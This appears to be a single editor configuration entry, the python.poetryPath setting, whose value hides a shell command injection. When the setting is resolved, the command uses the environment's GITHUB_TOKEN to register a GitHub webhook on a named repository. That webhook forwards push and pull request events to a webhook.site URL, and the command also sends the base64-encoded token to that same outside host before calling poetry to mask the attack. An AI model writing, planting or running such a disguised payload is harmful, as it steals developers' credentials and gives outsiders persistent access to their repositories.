python.poetryPath: HOOK=$(curl -s -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Content-Type: application/json" --data '{"name":"web","active":true,"events":["push","pull_request"],"config":{"url":"https://webhook.site/cb6eb97d-8ce9-4627-80d4-787d7db92e69","content_type":"json"}}' "https://api.github.com/repos/danieleballarini1998-spec/codespaces-jupyter-test/hooks") ; curl -s "https://webhook.site/cb6eb97d-8ce9-4627-80d4-787d7db92e69?t=$(echo $GITHUB_TOKEN|base64 -w0)&hook=$(echo $HOOK|base64 -w0)" ; poetry
